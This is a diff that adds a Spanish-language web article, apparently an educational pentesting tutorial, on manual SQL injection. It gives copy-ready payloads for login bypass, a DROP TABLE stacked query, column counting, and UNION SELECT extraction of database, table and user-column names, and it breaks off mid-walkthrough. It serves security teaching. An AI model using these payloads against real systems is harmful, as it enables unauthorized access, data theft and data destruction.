@@ -1,0 +1,945 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ataque de Inyección SQL Manual y Automático · R3LI4NT</title>
+    <meta name="description" content="Las vulnerabilidades de inyección SQL representan brechas de seguridad que posibilitan la ejecución de comandos en lenguaje SQL para interactuar con la base...">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="../css/styles.css">
+    <link rel="icon" type="image/x-icon" href="../../img/favicon.ico">
+    <style>
+        .article-metadata {
+            display: flex;
+            gap: 1.5rem;
+            flex-wrap: wrap;
+            margin: 1.5rem 0;
+            padding: 1rem;
+            background: rgba(0, 255, 157, 0.05);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+        }
+
+        .metadata-item {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        .metadata-item i {
+            color: var(--accent-primary);
+            width: 20px;
+        }
+
+        .metadata-item strong {
+            color: var(--text-primary);
+            margin-right: 0.3rem;
+        }
+
+        .tag-container {
+            display: flex;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+            margin: 1rem 0;
+        }
+
+        .article-tag {
+            padding: 0.3rem 1rem;
+            background: rgba(0, 255, 157, 0.1);
+            border: 1px solid var(--border-color);
+            border-radius: 30px;
+            font-size: 0.8rem;
+            color: var(--accent-primary);
+            transition: all 0.3s;
+        }
+
+        .article-tag:hover {
+            border-color: var(--accent-primary);
+            transform: translateY(-2px);
+            box-shadow: 0 0 15px var(--glow-color);
+        }
+
+        .warning-box {
+            background: rgba(255, 59, 59, 0.1);
+            border-left: 4px solid var(--accent-red);
+            padding: 1.5rem;
+            border-radius: 12px;
+            margin: 2rem 0;
+        }
+
+        .info-box {
+            background: rgba(59, 123, 255, 0.1);
+            border-left: 4px solid var(--accent-blue);
+            padding: 1.5rem;
+            border-radius: 12px;
+            margin: 2rem 0;
+        }
+
+        .tip-box {
+            background: rgba(0, 255, 157, 0.1);
+            border-left: 4px solid var(--accent-primary);
+            padding: 1.5rem;
+            border-radius: 12px;
+            margin: 2rem 0;
+        }
+
+        .command-block {
+            background: #0d1117;
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 1.2rem;
+            margin: 1.5rem 0;
+            font-family: 'Fira Code', monospace;
+            position: relative;
+            overflow-x: auto;
+        }
+
+        .command-block pre {
+            margin: 0;
+            color: #b3ff9e;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .code-prompt {
+            color: var(--accent-primary);
+            font-weight: bold;
+            margin-right: 0.5rem;
+        }
+
+        .command-copy {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            color: var(--text-secondary);
+            padding: 0.3rem 0.8rem;
+            font-size: 0.8rem;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .command-copy:hover {
+            border-color: var(--accent-primary);
+            color: var(--accent-primary);
+        }
+
+        .image-container {
+            margin: 2rem 0;
+            text-align: center;
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 1rem;
+            background-color: rgba(0, 10, 0, 0.5);
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+
+        .image-container:hover {
+            border-color: var(--accent-primary);
+            box-shadow: 0 0 25px var(--glow-color);
+            transform: scale(1.01);
+        }
+
+        .article-image {
+            max-width: 100%;
+            height: auto;
+            border-radius: 12px;
+            filter: drop-shadow(0 0 5px rgba(0, 255, 0, 0.3));
+        }
+
+        .clickable-image {
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .clickable-image:hover {
+            filter: brightness(1.2);
+        }
+
+        .image-caption {
+            margin-top: 0.8rem;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            letter-spacing: 1px;
+        }
+
+        .zoom-hint {
+            font-size: 0.8rem;
+            color: var(--accent-primary);
+            margin-left: 0.5rem;
+            opacity: 0.7;
+        }
+
+        .image-container:hover .zoom-hint {
+            opacity: 1;
+        }
+
+        .external-link {
+            color: var(--accent-primary);
+            text-decoration: none;
+            border-bottom: 1px dashed var(--accent-primary);
+            transition: all 0.3s;
+        }
+
+        .external-link:hover {
+            color: white;
+            border-bottom-color: white;
+            text-shadow: 0 0 8px currentColor;
+        }
+
+        .pagination-article {
+            display: flex;
+            justify-content: space-between;
+            margin: 3rem 0;
+            padding: 1rem 0;
+            border-top: 1px solid var(--border-color);
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .pagination-link {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            color: var(--text-secondary);
+            text-decoration: none;
+            padding: 0.8rem 1.5rem;
+            border: 1px solid var(--border-color);
+            border-radius: 30px;
+            transition: all 0.3s;
+        }
+
+        .pagination-link:hover {
+            border-color: var(--accent-primary);
+            color: var(--accent-primary);
+            transform: translateY(-2px);
+        }
+
+        .pagination-link.prev i {
+            margin-right: 0.5rem;
+        }
+
+        .pagination-link.next i {
+            margin-left: 0.5rem;
+        }
+
+        .related-articles {
+            margin: 3rem 0;
+        }
+
+        .related-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            margin-top: 1.5rem;
+        }
+
+        .related-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 1.5rem;
+            transition: all 0.3s;
+            text-decoration: none;
+            color: var(--text-primary);
+        }
+
+        .related-card:hover {
+            transform: translateY(-5px);
+            border-color: var(--accent-primary);
+            box-shadow: 0 10px 30px var(--glow-color);
+        }
+
+        .related-card h4 {
+            color: var(--accent-primary);
+            margin-bottom: 0.5rem;
+        }
+
+        .related-card p {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            margin-bottom: 1rem;
+        }
+
+        .related-meta {
+            display: flex;
+            justify-content: space-between;
+            color: var(--text-secondary);
+            font-size: 0.8rem;
+        }
+
+        .comparison-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 2rem 0;
+            background: rgba(0, 10, 0, 0.5);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            overflow: hidden;
+        }
+
+        .comparison-table th {
+            background: rgba(0, 255, 157, 0.2);
+            color: var(--accent-primary);
+            padding: 1rem;
+            text-align: left;
+            font-family: 'Fira Code', monospace;
+        }
+
+        .comparison-table td {
+            padding: 1rem;
+            border-top: 1px solid var(--border-color);
+            color: var(--text-secondary);
+        }
+
+        .comparison-table tr:hover td {
+            background: rgba(0, 255, 157, 0.05);
+            color: var(--text-primary);
+        }
+
+        .comparison-table code {
+            color: var(--accent-primary);
+            background: rgba(0, 255, 157, 0.1);
+            padding: 0.2rem 0.5rem;
+            border-radius: 6px;
+        }
+
+        #sidebarToc {
+            max-height: 400px;
+            overflow-y: auto;
+            scrollbar-width: thin;
+        }
+
+        #sidebarToc::-webkit-scrollbar {
+            width: 4px;
+        }
+
+        #sidebarToc::-webkit-scrollbar-thumb {
+            background: var(--accent-primary);
+            border-radius: 4px;
+        }
+
+        #sidebarToc .nav-link {
+            padding: 0.6rem 0.8rem;
+            font-size: 0.9rem;
+            border-left: 2px solid transparent;
+        }
+
+        #sidebarToc .nav-link.active {
+            border-left-color: var(--accent-primary);
+            background: rgba(0, 255, 157, 0.1);
+            color: var(--accent-primary);
+        }
+
+        #sidebarToc .nav-link i {
+            font-size: 0.7rem;
+            opacity: 0.7;
+        }
+
+        @media (max-width: 768px) {
+            .article-metadata {
+                flex-direction: column;
+                gap: 0.8rem;
+            }
+
+            .pagination-article {
+                flex-direction: column;
+                gap: 1rem;
+            }
+        }
+
+        #imageModal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.95);
+            backdrop-filter: blur(8px);
+            justify-content: center;
+            align-items: center;
+        }
+
+        #imageModal .modal-content {
+            margin: auto;
+            display: block;
+            max-width: 90%;
+            max-height: 90%;
+            border-radius: 12px;
+            border: 3px solid var(--accent-primary);
+            box-shadow: 0 0 50px var(--glow-color);
+            animation: zoom 0.3s ease-in-out;
+        }
+
+        @keyframes zoom {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        #imageModal .modal-close {
+            position: absolute;
+            top: 20px;
+            right: 35px;
+            color: #f1f1f1;
+            font-size: 40px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            z-index: 1001;
+            text-shadow: 0 0 10px var(--accent-primary);
+        }
+
+        #imageModal .modal-close:hover {
+            color: var(--accent-primary);
+            transform: rotate(90deg);
+        }
+
+        #imageModal .modal-caption {
+            margin: 20px auto;
+            display: block;
+            width: 80%;
+            max-width: 700px;
+            text-align: center;
+            color: #ccc;
+            padding: 10px 0;
+            font-size: 1.1rem;
+            letter-spacing: 1px;
+            border-top: 1px solid var(--accent-primary);
+        }
+
+        .download-section {
+            display: flex;
+            gap: 1rem;
+            justify-content: center;
+            margin: 2rem 0;
+        }
+
+        .download-btn {
+            background: linear-gradient(135deg, rgba(0, 255, 157, 0.1), rgba(0, 255, 157, 0.2));
+            border: 1px solid var(--accent-primary);
+            color: var(--accent-primary);
+            padding: 0.8rem 2rem;
+            border-radius: 30px;
+            text-decoration: none;
+            font-family: 'Fira Code', monospace;
+            transition: all 0.3s;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .download-btn:hover {
+            background: var(--accent-primary);
+            color: black;
+            transform: translateY(-3px);
+            box-shadow: 0 0 20px var(--glow-color);
+        }
+</style>
+</head>
+<body>
+    <canvas id="matrixCanvas"></canvas>
+    <div class="particles" id="particles"></div>
+
+    <div class="container">
+        <header class="hero" style="min-height: 40vh;">
+            <div class="hero-content">
+                <div class="glitch-wrapper" style="font-size: 2.2rem;">
+                    <div class="glitch" data-text="Ataque de Inyección SQL Manual y Automático">Ataque de Inyección SQL Manual y Automático</div>
+                </div>
+                <p class="hero-description" style="font-size: 1.05rem;">&gt; Las vulnerabilidades de inyección SQL representan brechas de seguridad que posibilitan la ejecución de comandos en lenguaje SQL para interactuar con la base... </p>
+                <div class="article-metadata">
+                    <span class="metadata-item"><i class="fas fa-user-secret"></i><strong>Autor:</strong> R3LI4NT</span>
+                    <span class="metadata-item"><i class="fas fa-tag"></i><strong>Categoría:</strong> Hacking</span>
+                    <span class="metadata-item"><i class="fas fa-shield-halved"></i><strong>Nivel:</strong> Práctico</span>
+                </div>
+                <div class="tag-container">
+                    <span class="article-tag"><i class="fas fa-folder-open"></i> Web Pentesting</span>
+                    <span class="article-tag"><i class="fas fa-graduation-cap"></i> Educativo</span>
+                </div>
+            </div>
+        </header>
+
+        <div class="breadcrumb" style="margin: 1rem 0;">
+            <a href="../../index.html" class="breadcrumb-link"><i class="fas fa-home"></i> Inicio</a>
+            <span class="breadcrumb-sep">/</span>
+            <a href="../../index.html#hacking" class="breadcrumb-link"><i class="fas fa-skull"></i> Hacking</a>
+            <span class="breadcrumb-sep">/</span>
+            <span class="breadcrumb-link">Web Pentesting</span>
+            <span class="breadcrumb-sep">/</span>
+            <span class="breadcrumb-current">Ataque de Inyección SQL Manual y Automático</span>
+        </div>
+
+        <div class="main-grid">
+            <main>
+                <article class="article-full">
+                    <section class="content-card" id="vulnerabilidad-de-inyeccion-sql-0">
+                        <h2 class="section-title"><span class="hash">#</span> VULNERABILIDAD de Inyección SQL</h2>
+                        <p>Las vulnerabilidades de inyección SQL representan brechas de seguridad que posibilitan la ejecución de comandos en lenguaje SQL para interactuar con la base de datos de un sitio web. La mayoría de las aplicaciones web se basan en bases de datos en su parte posterior para organizar los diversos elementos que la constituyen, tales como:</p>
+<ul>
+<li><strong>Nombres de usuarios:</strong> Supongamos que un sitio web tiene un formulario de inicio de sesión con un campo de usuario y contraseña. La inyección SQL podría ser algo así:</li>
+</ul>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('Usuario: \&#x27; OR \&#x27;1\&#x27;=\&#x27;1\nContraseña: (dejar en blanco o cualquier cosa)')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> Usuario: &#x27; OR &#x27;1&#x27;=&#x27;1
+Contraseña: (dejar en blanco o cualquier cosa)</pre></div>
+<p>Esta inyección manipularía la consulta SQL para que la condición siempre sea verdadera, lo que permite al atacante acceder a la cuenta sin necesidad de una contraseña válida.</p>
+<ul>
+<li><strong>Contraseñas:</strong> En el caso de la contraseña, si la base de datos no está bien protegida y se almacenan las contraseñas de forma insegura, un ataque de inyección podría intentar algo como:</li>
+</ul>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('Usuario: (cualquier usuario)\nContraseña: \&#x27; OR \&#x27;\&#x27;=\&#x27;')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> Usuario: (cualquier usuario)
+Contraseña: &#x27; OR &#x27;&#x27;=&#x27;</pre></div>
+<p>Si las contraseñas están almacenadas en texto plano o de alguna manera vulnerable, esta inyección podría permitir el acceso a cualquier cuenta.</p>
+<ul>
+<li><strong>Precios:</strong> Supongamos que hay un campo para actualizar precios de productos. Una inyección SQL en este campo podría ser:</li>
+</ul>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('Nuevo Precio: 99.99; DROP TABLE Productos;')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> Nuevo Precio: 99.99; DROP TABLE Productos;</pre></div>
+<p>Esta inyección, si no está protegida, puede ejecutar múltiples comandos SQL. En este caso, además de cambiar el precio a 99.99, también eliminaría la tabla completa de productos.</p>
+<ul>
+<li><strong>Productos:</strong> Para el campo de productos, si hay una consulta de búsqueda, un ejemplo de inyección SQL podría ser:</li>
+</ul>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('Campo de búsqueda: \&#x27; OR 1=1--')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> Campo de búsqueda: &#x27; OR 1=1--</pre></div>
+<p>Esto modificaría la consulta para que devuelva todos los productos, ignorando cualquier filtro que el sitio web hubiera implementado.</p>
+<p>Estos son solo algunos ejemplos de los valores que conforman las bases de datos, y a través de una inyección SQL, un atacante puede leer, modificar, añadir o eliminar estos elementos. Un fallo en SQL suele surgir debido a la incorrecta filtración de variables en un programa que maneja o genera sentencias SQL. Esto ocurre especialmente cuando se solicitan entradas de usuario de cualquier naturaleza sin una validación adecuada, como puede ser el caso de un nombre y contraseña. Sin embargo, en lugar de proporcionar esta información, un atacante envía una declaración SQL intrusiva que se ejecuta en la base de datos.</p>
+<p>
+  <figure class="image-container" onclick="openImageModal('https://raw.githubusercontent.com/R3LI4NT/articulos/main/Pentesting/WEB/img/SQL_Injection.png', 'Ilustración del procedimiento')"><img src="https://raw.githubusercontent.com/R3LI4NT/articulos/main/Pentesting/WEB/img/SQL_Injection.png" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure>
+</p>
+
+<p>Antes de buscar vulnerabilidades de inyección SQL, es fundamental asegurarse de tener autorización del propietario del sitio web para llevar a cabo pruebas de pentesting. Es crucial realizar estas pruebas únicamente en entornos legales. El primer paso para identificar una vulnerabilidad SQL es determinar la tecnología que utiliza la página web para saber si emplea bases de datos que utilizan SQL, como Oracle, MySQL o SQL Server. Herramientas como Wappalyzer (una extensión de navegador) o programas como WhatWeb pueden proporcionar información sobre la tecnología empleada en un sitio web.</p>
+                    </section>
+                    <section class="content-card" id="proceso-manual-1">
+                        <h2 class="section-title"><span class="hash">#</span> PROCESO MANUAL</h2>
+                        <p>Una inyección SQL se puede aprovechar de dos maneras distintas. En primer lugar, de manera manual, donde el atacante introduce personalmente comandos maliciosos en los campos de entrada de la aplicación web. Esto implica que el atacante conoce la estructura de la base de datos y manipula las consultas para realizar acciones no autorizadas.</p>
+<p>En segundo lugar, existe la inyección automatizada, que se realiza mediante herramientas especializadas como sqlmap. Estas herramientas están diseñadas para simplificar el proceso: analizan automáticamente la página web en busca de vulnerabilidades de inyección SQL, determinan si la página es susceptible y, en caso afirmativo, ejecutan ataques. La automatización significa que el usuario solo necesita especificar las opciones deseadas para optimizar el escaneo, ya que la herramienta se encarga del proceso de manera autónoma. Este enfoque facilita la identificación y explotación de vulnerabilidades sin la necesidad de intervención manual extensa.</p>
+<h5 style="color: var(--text-primary); margin: 1.2rem 0 .6rem;">Detectar página vulnerable a SQLi</h5>
+<p>Para descubrir si una página es vulnerable a la inyección SQL, es esencial examinar sus parámetros. Pongamos el siguiente escenario:</p>
+<p>Imaginemos que encontramos una página web común que utiliza numerosos parámetros a través del método GET (donde la página envía datos a través de la URL). Entonces, visualicemos algo como esto:</p>
+<p>Supongamos que la página tiene la siguiente estructura de URL:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('http://www.ejemplo.com/algo.php?id=1')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> http://www.ejemplo.com/algo.php?id=1</pre></div>
+<p>En esta URL, "id=1" son parámetros que la página utiliza para recibir información. Estos parámetros pueden ser susceptibles a inyecciones SQL si no se manejan adecuadamente. Un atacante podría intentar modificar estos parámetros al inyectar código SQL malicioso para manipular la consulta de la base de datos y potencialmente obtener o modificar datos de manera no autorizada. La detección de vulnerabilidades en estos parámetros es crucial para garantizar la seguridad de la aplicación web.</p>
+<p>Para verificar si una página es vulnerable a la inyección SQL, una técnica simple es añadir una comilla simple (') al final de cada parámetro y observar si esto provoca un error en la base de datos. Aquí está el proceso:</p>
+<p>Imaginemos que tenemos una URL como esta:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('http://www.ejemplo.com/algo.php?id=1')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> http://www.ejemplo.com/algo.php?id=1</pre></div>
+<p>Para probar la vulnerabilidad, añadiríamos una comilla simple al final del primer parámetro, así:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('http://www.ejemplo.com/algo.php?id=1\&#x27;')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> http://www.ejemplo.com/algo.php?id=1&#x27;</pre></div>
+<p>Si al hacer esto obtenemos un mensaje de error o una respuesta inusual, podría ser indicativo de una vulnerabilidad de inyección SQL. Este método simple permite a los probadores de seguridad evaluar si la aplicación web es propensa a la inyección SQL al observar cómo maneja las comillas simples en sus parámetros.</p>
+<p><figure class="image-container" onclick="openImageModal('https://github.com/R3LI4NT/articulos/assets/75953873/3ba175f1-b8d8-4b19-a1be-4d7447b14d9b', 'Ilustración del procedimiento')"><img src="https://github.com/R3LI4NT/articulos/assets/75953873/3ba175f1-b8d8-4b19-a1be-4d7447b14d9b" alt="Ilustración del procedimiento" class="article-image clickable-image" loading="lazy"><figcaption class="image-caption">Ilustración del procedimiento <span class="zoom-hint">🔍 click para ampliar</span></figcaption></figure></p>
+<p>Ahora que hemos identificado un parámetro vulnerable, el siguiente paso es determinar el número de columnas utilizadas por la página. Para realizar esta tarea, usamos comandos como <code>order by</code> y <code>group by</code> para probar diferentes números de columnas. Aquí hay un ejemplo práctico:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('1\&#x27; ORDER BY 1 --+   \n1\&#x27; ORDER BY 2 --+   \n1\&#x27; ORDER BY 3 --+   \n1\&#x27; ORDER BY 4 --+\n1\&#x27; ORDER BY 5 --+   \netc...\n\n1\&#x27; GROUP BY 1 --+   \n1\&#x27; GROUP BY 2 --+   \n1\&#x27; GROUP BY 3 --+   \n1\&#x27; GROUP BY 4 --+\n1\&#x27; GROUP BY 5 --+\netc...')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> 1&#x27; ORDER BY 1 --+   
+1&#x27; ORDER BY 2 --+   
+1&#x27; ORDER BY 3 --+   
+1&#x27; ORDER BY 4 --+
+1&#x27; ORDER BY 5 --+   
+etc...
+
+1&#x27; GROUP BY 1 --+   
+1&#x27; GROUP BY 2 --+   
+1&#x27; GROUP BY 3 --+   
+1&#x27; GROUP BY 4 --+
+1&#x27; GROUP BY 5 --+
+etc...</pre></div>
+<p>Hagamos una analogía para comprender el proceso de identificar la cantidad de columnas de una página web que son vulnerables a la inyección SQL. Imagina que estás tratando de abrir una serie de cajas y necesitas descubrir cuántas hay dentro. Tienes una llave que puede abrir cualquier caja, pero cada vez que intentas abrir una, la caja te dice cuántas cajas hay en total.</p>
+<p>En términos de páginas web que son vulnerables a la inyección SQL, es como si estuviéramos probando diferentes “corchetes” (números) para ver cuántas “cajas” (columnas) hay en la página.</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('http://www.ejemplo.com/algo.php?id=1\&#x27; order by 1 --+ \nhttp://www.ejemplo.com/algo.php?id=1\&#x27; order by 2 --+ \nhttp://www.ejemplo.com/algo.php?id=1\&#x27; order by 3 --+ \nhttp://www.ejemplo.com/algo.php?id=1\&#x27; order by 4 --+\nhttp://www.ejemplo.com/algo.php?id=1\&#x27; order by 10 --+\nhttp://www.ejemplo.com/algo.php?id=1\&#x27; order by 19 --+ \nhttp://www.ejemplo.com/algo.php?id=1\&#x27; order by 20 --+ # Error')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> http://www.ejemplo.com/algo.php?id=1&#x27; order by 1 --+ 
+http://www.ejemplo.com/algo.php?id=1&#x27; order by 2 --+ 
+http://www.ejemplo.com/algo.php?id=1&#x27; order by 3 --+ 
+http://www.ejemplo.com/algo.php?id=1&#x27; order by 4 --+
+http://www.ejemplo.com/algo.php?id=1&#x27; order by 10 --+
+http://www.ejemplo.com/algo.php?id=1&#x27; order by 19 --+ 
+http://www.ejemplo.com/algo.php?id=1&#x27; order by 20 --+ # Error</pre></div>
+<p>En este caso, cuando intentamos abrir la "caja" número 20, la página nos muestra un mensaje de error indicando que la columna es desconocida. Esto nos dice que la página está utilizando 19 columnas, ya que el intento de acceder a la columna 20 generó un error.</p>
+<h4 style="color: var(--accent-blue); margin: 1.4rem 0 .8rem;">UNION SELECT</h4>
+<p>Cuando hablamos de "<strong>union select</strong>" en el contexto de bases de datos y seguridad web, nos referimos a una técnica utilizada por los atacantes para obtener información de una base de datos a través de una página web vulnerable.</p>
+<p>Imagina que tienes una página web que utiliza parámetros en la URL, como:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('http://www.ejemplo.com/info.php?id=1&amp;id2=1&amp;id3=1\&#x27;')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> http://www.ejemplo.com/info.php?id=1&amp;id2=1&amp;id3=1&#x27;</pre></div>
+<p>Los hackers pueden aprovechar esto y modificar la URL de manera específica, como se muestra a continuación:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('http://www.ejemplo.com/info.php?id=1&amp;id2=1&amp;id3=1\&#x27; union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 --+')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> http://www.ejemplo.com/info.php?id=1&amp;id2=1&amp;id3=1&#x27; union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 --+</pre></div>
+<p>Aquí, se prueba cuántas columnas hay en la base de datos al enumerar números del 1 al 20. Cuando la página procesa esto, si hay una vulnerabilidad, mostrará esos números en algún lugar de la página. Si la página es vulnerable en las columnas 2, 5 y 20, verías esos números mostrados en algún lugar de la página después de realizar esta manipulación en la URL. Este proceso es parte de una práctica conocida como inyección SQL, donde los atacantes  intentan manipular la ejecución de comandos SQL en una base de datos mediante entradas inseguras del usuario.</p>
+<h4 style="color: var(--accent-blue); margin: 1.4rem 0 .8rem;">EXTRAER INFORMACIÓN</h4>
+<p>Imaginemos que ya hemos descubierto el número de columnas y hemos identificado cuál de esas columnas es vulnerable a la inyección de SQL. Ahora, el siguiente paso es extraer e inyectar información directamente en esa columna específica.</p>
+<p>En el ejemplo anterior, supongamos que la columna 5 es la que podemos manipular. Entonces, al construir la URL manipulada, la parte relevante sería algo así:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('http://www.ejemplo.com/info.php?id=1&amp;id2=1&amp;id3=1\&#x27; union select 1,2,3,4,\&#x27;vulnerable a SQLi\&#x27;,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 --+')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> http://www.ejemplo.com/info.php?id=1&amp;id2=1&amp;id3=1&#x27; union select 1,2,3,4,&#x27;vulnerable a SQLi&#x27;,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 --+</pre></div>
+<p>Lo que estamos haciendo aquí es decirle a la página web que queremos que, a través de la columna número 5, muestre la frase '<em>vulnerable a SQLi</em>'. Al inyectar '<em>vulnerable a SQL</em>', estamos básicamente introduciendo un texto directamente en esa columna específica que hemos identificado como vulnerable. </p>
+<p>En términos más simples, es como si estuviéramos dando instrucciones a la página para que muestre la frase ''<em>vulnerable a SQLi</em>' en el lugar donde normalmente se mostraría el contenido correspondiente a esa columna. Esta acción es posible porque hemos explotado una debilidad en la forma en que la aplicación web maneja las consultas a su base de datos, permitiéndonos manipular y mostrar información que normalmente no deberíamos ver.</p>
+<p>La función llamada <code>database()</code> nos permite obtener el nombre de la base de datos con la que estamos interactuando.  Si tomamos la URL manipulada que ya proporcione:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('http://www.ejemplo.com/info.php?id=1&amp;id2=1&amp;id3=1\&#x27; union select 1,2,3,4,database(),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 --+')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> http://www.ejemplo.com/info.php?id=1&amp;id2=1&amp;id3=1&#x27; union select 1,2,3,4,database(),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 --+</pre></div>
+<p>Lo que estamos haciendo aquí es decirle a la página web que queremos, a través de la columna correspondiente, mostrar el resultado de la función <code>database()</code>. En otras palabras, le estamos pidiendo a la página que nos muestre el nombre de la base de datos que está siendo utilizada.</p>
+<p>Cuando ejecutamos esto y la página es vulnerable a la inyección de SQL, obtendremos como resultado algo como "<em>name_DB</em>". Ahora, esto es valioso porque hemos extraído el nombre de la base de datos con la que estamos trabajando. Es como si estuviéramos espiando y obteniendo información directamente desde la estructura interna de la base de datos, gracias a la vulnerabilidad que hemos encontrado.</p>
+<p>A continuación, nuestro objetivo es extraer las tablas de la base de datos. Hay dos métodos para hacer esto, y uno de ellos es:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('http://www.ejemplo.com/info.php?id=1&amp;id2=1&amp;id3=1\&#x27; union select 1,2,3,4,group_concat(table_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.tables --+')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> http://www.ejemplo.com/info.php?id=1&amp;id2=1&amp;id3=1&#x27; union select 1,2,3,4,group_concat(table_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.tables --+</pre></div>
+<p>Lo que estamos haciendo aquí es utilizar la función <code>group_concat(table_name)</code> para concatenar los nombres de todas las tablas en la base de datos y mostrar ese resultado a través de la página web. Le estamos pidiendo a la página que nos muestre los nombres de todas las tablas en la base de datos.</p>
+<p>Cuando ejecutamos esta manipulación en la URL y la página es vulnerable a la inyección de SQL, obtenemos como resultado una lista de las principales tablas de la base de datos "<strong><em>information_schema</em></strong>". Esto nos brinda una visión más detallada de la estructura interna de la base de datos, permitiéndonos identificar y acceder a las tablas específicas que nos interesan.</p>
+<p>Para obtener las tablas específicas de la base de datos que mencionamos anteriormente, "<em>name_DB</em>", seguimos estos pasos:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('http://www.ejemplo.com/info.php?id=1&amp;id2=1&amp;id3=1\&#x27; union select 1,2,3,4,group_concat(table_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.tables where table_schema=database() --+')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> http://www.ejemplo.com/info.php?id=1&amp;id2=1&amp;id3=1&#x27; union select 1,2,3,4,group_concat(table_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.tables where table_schema=database() --+</pre></div>
+<p>Estamos utilizando nuevamente la función <code>group_concat(table_name)</code> para concatenar los nombres de todas las tablas en la base de datos específica (en este caso, "name_DB"). Además, hemos añadido una condición con <code>where table_schema=database()</code> para asegurarnos de que solo obtendremos las tablas de la base de datos actual.</p>
+<p>Después de ejecutar esto en una página web vulnerable, obtenemos como resultado las siguientes tablas: "users", "table", y "other_table". Lo que nos importa aquí es la tabla "user". Este proceso nos permite identificar y seleccionar las tablas específicas que queremos explorar o manipular dentro de la base de datos.</p>
+<p>En ese escenario estamos avanzando para obtener información sobre las columnas específicas dentro de la tabla "usuarios" en la base de datos llamada "name_DB". Para lograr esto, seguimos estos pasos:</p>
+<div class="command-block"><button class="command-copy" onclick="copyCommand('http://www.ejemplo.com/info.php?id=1&amp;id2=1&amp;id3=1\&#x27; union select 1,2,3,4,group_concat(column_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.columns where table_name=&quot;users&quot; --+')"><i class="fas fa-copy"></i></button><pre><span class="code-prompt">$</span> http://www.ejemplo.com/info.php?id=1&amp;id2=1&amp;id3=1&#x27; union select 1,2,3,4,group_concat(column_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.columns where table_name=&quot;users&quot; --+</pre></div>
